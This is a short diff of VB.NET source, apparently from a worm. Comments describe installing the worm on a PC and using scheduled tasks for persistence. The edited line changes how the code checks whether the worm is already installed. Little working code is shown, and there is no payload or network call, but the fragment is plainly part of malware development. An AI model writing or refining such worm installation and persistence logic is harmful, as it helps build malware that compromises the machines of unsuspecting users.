@@ -5,7 +5,7 @@
         'Install worm on PC
         'Using schtasks instead of reg and startup folder
 
-        If Settings.DROP AndAlso Reflection.Assembly.GetExecutingAssembly.Location <> Settings.fullpath Then 'Checking if worm is already installed
+        If Settings.DROP AndAlso Application.ExecutablePath <> Settings.fullpath Then 'Checking if worm is already installed
 
             'Worm not installed// begin installing
             Try
